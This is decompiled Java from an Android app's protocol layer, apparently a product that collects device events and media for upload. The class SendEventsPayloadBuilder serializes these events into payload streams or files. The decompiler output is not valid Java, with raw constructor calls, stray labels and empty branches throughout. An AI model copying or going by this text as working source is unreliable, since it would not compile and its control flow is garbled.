package com.vvt.phoenix.prot.databuilder;

import com.vvt.io.d;
import com.vvt.phoenix.a.b;
import com.vvt.phoenix.prot.command.aa;
import com.vvt.phoenix.prot.command.e;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;

public class af
  extends r
{
  private static final boolean a;
  private boolean b;
  private ao c;
  
  static
  {
    boolean bool = com.vvt.phoenix.a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      return;
    }
  }
  
  private OutputStream a(ByteArrayOutputStream paramByteArrayOutputStream, e parame)
  {
    int i = 2;
    boolean bool1 = a;
    if (bool1) {}
    d.a(paramByteArrayOutputStream);
    ByteArrayOutputStream localByteArrayOutputStream = new java/io/ByteArrayOutputStream;
    localByteArrayOutputStream.<init>();
    boolean bool3 = false;
    byte[] arrayOfByte = null;
    for (;;)
    {
      bool1 = parame.a();
      if (!bool1) {
        break;
      }
      localObject1 = parame.b();
      if (localObject1 != null)
      {
        k = localObject1 instanceof com.vvt.phoenix.prot.event.r;
        if (k != 0) {}
      }
      else
      {
        localObject2 = a();
        IllegalArgumentException localIllegalArgumentException = new java/lang/IllegalArgumentException;
        String str = "Got null event or probably non Event instance !";
        localIllegalArgumentException.<init>(str);
        b.a((String)localObject2, localIllegalArgumentException);
      }
      k = a;
      if (k != 0) {}
      localObject1 = (com.vvt.phoenix.prot.event.r)localObject1;
      com.vvt.phoenix.prot.a.c.a((com.vvt.phoenix.prot.event.r)localObject1, localByteArrayOutputStream);
      int j = bool3 + true;
      bool3 = j;
    }
    boolean bool2 = a;
    if (bool2) {}
    Object localObject1 = new java/io/ByteArrayOutputStream;
    ((ByteArrayOutputStream)localObject1).<init>();
    int k = 1;
    Object localObject2 = com.vvt.phoenix.a.a.a(k);
    ((ByteArrayOutputStream)localObject1).write((byte[])localObject2, 0, i);
    arrayOfByte = com.vvt.phoenix.a.a.a((short)bool3);
    ((ByteArrayOutputStream)localObject1).write(arrayOfByte, 0, i);
    localByteArrayOutputStream.writeTo((OutputStream)localObject1);
    d.a(localByteArrayOutputStream);
    bool3 = a;
    if (bool3) {}
    return (OutputStream)localObject1;
  }
  
  private OutputStream a(FileOutputStream paramFileOutputStream, e parame)
  {
    boolean bool1 = false;
    ByteArrayOutputStream localByteArrayOutputStream = null;
    int i = 1;
    int j = 2;
    boolean bool2 = a;
    if (bool2) {}
    long l1 = 0L;
    bool2 = parame.a();
    Object localObject1;
    boolean bool5;
    Object localObject2;
    Object localObject3;
    Object localObject4;
    FileChannel localFileChannel;
    long l2;
    if (bool2)
    {
      localObject1 = parame.b();
      if (localObject1 != null)
      {
        bool5 = localObject1 instanceof com.vvt.phoenix.prot.event.r;
        if (bool5) {}
      }
      else
      {
        localObject2 = a();
        localObject3 = new java/lang/IllegalArgumentException;
        localObject4 = "Got null event or probably non Event instance !";
        ((IllegalArgumentException)localObject3).<init>((String)localObject4);
        b.a((String)localObject2, (Exception)localObject3);
      }
      bool5 = localObject1 instanceof com.vvt.phoenix.prot.event.a;
      if (bool5)
      {
        bool5 = a;
        if (bool5) {}
        this.b = i;
        localObject2 = new com/vvt/phoenix/prot/databuilder/ao;
        ((ao)localObject2).<init>();
        this.c = ((ao)localObject2);
        b().f(0);
        b().e(0);
        d.a(paramFileOutputStream);
        localObject2 = new java/io/File;
        localObject3 = e();
        ((File)localObject2).<init>((String)localObject3);
        ((File)localObject2).delete();
        localFileChannel = null;
        l2 = l1;
      }
    }
    for (;;)
    {
      bool5 = a;
      if (bool5) {}
      bool5 = this.b;
      label230:
      label234:
      boolean bool6;
      String str;
      if (bool5)
      {
        localObject2 = this.c;
        localObject1 = com.vvt.phoenix.prot.a.c.a((com.vvt.phoenix.prot.event.r)localObject1);
        ((ao)localObject2).a((com.vvt.phoenix.prot.b.c)localObject1);
        bool5 = i;
        bool2 = parame.a();
        if (!bool2) {
          break label525;
        }
        localObject1 = parame.b();
        if (localObject1 != null)
        {
          bool6 = localObject1 instanceof com.vvt.phoenix.prot.event.r;
          if (bool6) {}
        }
        else
        {
          localObject3 = a();
          localObject4 = new java/lang/IllegalArgumentException;
          str = "Got null event or probably non Event instance !";
          ((IllegalArgumentException)localObject4).<init>(str);
          b.a((String)localObject3, (Exception)localObject4);
        }
        bool6 = a;
        if (bool6) {}
        bool6 = this.b;
        if (!bool6) {
          break label468;
        }
        bool6 = localObject1 instanceof com.vvt.phoenix.prot.event.a;
        if (!bool6)
        {
          localObject3 = a();
          localObject4 = new java/lang/IllegalArgumentException;
          str = "Mixing between ACTUAL MEDIA event and NON ACTUAL MEDIA event is not allow in virtual payload mode";
          ((IllegalArgumentException)localObject4).<init>(str);
          b.a((String)localObject3, (Exception)localObject4);
        }
        localObject3 = this.c;
        localObject1 = com.vvt.phoenix.prot.a.c.a((com.vvt.phoenix.prot.event.r)localObject1);
        ((ao)localObject3).a((com.vvt.phoenix.prot.b.c)localObject1);
      }
      for (;;)
      {
        int k = bool5 + true;
        bool5 = k;
        break label234;
        bool1 = a;
        if (bool1) {}
        this.b = false;
        localFileChannel = paramFileOutputStream.getChannel();
        l2 = localFileChannel.position();
        localObject2 = new byte[j];
        Object tmp433_431 = localObject2;
        tmp433_431[0] = 0;
        tmp433_431[1] = 0;
        paramFileOutputStream.write((byte[])localObject2, 0, j);
        break;
        localObject1 = (com.vvt.phoenix.prot.event.r)localObject1;
        com.vvt.phoenix.prot.a.c.a((com.vvt.phoenix.prot.event.r)localObject1, paramFileOutputStream);
        break label230;
        label468:
        bool6 = localObject1 instanceof com.vvt.phoenix.prot.event.a;
        if (bool6)
        {
          localObject3 = a();
          localObject4 = new java/lang/IllegalArgumentException;
          str = "Mixing between ACTUAL MEDIA event and NON ACTUAL MEDIA event is not allow in normal payload file";
          ((IllegalArgumentException)localObject4).<init>(str);
          b.a((String)localObject3, (Exception)localObject4);
        }
        localObject1 = (com.vvt.phoenix.prot.event.r)localObject1;
        com.vvt.phoenix.prot.a.c.a((com.vvt.phoenix.prot.event.r)localObject1, paramFileOutputStream);
      }
      label525:
      boolean bool3 = a;
      if (bool3) {}
      short s = (short)bool5;
      localObject1 = com.vvt.phoenix.a.a.a(s);
      bool5 = this.b;
      if (bool5)
      {
        bool1 = a;
        if (bool1) {}
        localByteArrayOutputStream = new java/io/ByteArrayOutputStream;
        localByteArrayOutputStream.<init>();
        byte[] arrayOfByte = com.vvt.phoenix.a.a.a(i);
        localByteArrayOutputStream.write(arrayOfByte, 0, j);
        localByteArrayOutputStream.write((byte[])localObject1, 0, j);
        localObject1 = this.c;
        arrayOfByte = localByteArrayOutputStream.toByteArray();
        ((ao)localObject1).a(arrayOfByte);
        d.a(localByteArrayOutputStream);
      }
      for (;;)
      {
        d.a(paramFileOutputStream);
        bool4 = a;
        if (bool4) {}
        return paramFileOutputStream;
        bool5 = a;
        if (bool5) {}
        localObject1 = ByteBuffer.wrap((byte[])localObject1);
        if (localFileChannel != null) {
          localFileChannel.write((ByteBuffer)localObject1, l2);
        }
      }
      boolean bool4 = false;
      localObject1 = null;
      localFileChannel = null;
      l2 = l1;
    }
  }
  
  protected OutputStream a(OutputStream paramOutputStream)
  {
    boolean bool = a;
    if (bool) {}
    byte[] arrayOfByte = com.vvt.phoenix.a.a.a((short)1);
    int i = 2;
    paramOutputStream.write(arrayOfByte, 0, i);
    bool = a;
    if (bool) {}
    return paramOutputStream;
  }
  
  protected String a()
  {
    return "SendEventsPayloadBuilder";
  }
  
  protected OutputStream b(OutputStream paramOutputStream)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = c();
    bool1 = localObject1 instanceof aa;
    Object localObject2;
    Object localObject3;
    if (!bool1)
    {
      localObject1 = a();
      localObject2 = new java/lang/IllegalArgumentException;
      localObject3 = "command data is not a SendEvents instance!";
      ((IllegalArgumentException)localObject2).<init>((String)localObject3);
      b.a((String)localObject1, (Exception)localObject2);
    }
    localObject1 = ((aa)c()).b();
    String str;
    if (localObject1 == null)
    {
      localObject2 = a();
      localObject3 = new java/lang/IllegalArgumentException;
      str = "Event Provider is null!";
      ((IllegalArgumentException)localObject3).<init>(str);
      b.a((String)localObject2, (Exception)localObject3);
    }
    boolean bool2 = d();
    if (bool2)
    {
      bool2 = paramOutputStream instanceof FileOutputStream;
      if (!bool2)
      {
        localObject2 = a();
        localObject3 = new java/lang/IllegalArgumentException;
        str = "stream is not a FileOutputStream instance!";
        ((IllegalArgumentException)localObject3).<init>(str);
        b.a((String)localObject2, (Exception)localObject3);
      }
      paramOutputStream = (FileOutputStream)paramOutputStream;
    }
    for (localObject1 = a(paramOutputStream, (e)localObject1);; localObject1 = a(paramOutputStream, (e)localObject1))
    {
      bool2 = a;
      if (bool2) {}
      return (OutputStream)localObject1;
      bool2 = paramOutputStream instanceof ByteArrayOutputStream;
      if (!bool2)
      {
        localObject2 = a();
        localObject3 = new java/lang/IllegalArgumentException;
        str = "stream is not a ByteArrayOutputStream instance!";
        ((IllegalArgumentException)localObject3).<init>(str);
        b.a((String)localObject2, (Exception)localObject3);
      }
      paramOutputStream = (ByteArrayOutputStream)paramOutputStream;
    }
  }
  
  protected boolean f()
  {
    return this.b;
  }
  
  protected ao g()
  {
    return this.c;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/phoenix/prot/databuilder/af.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */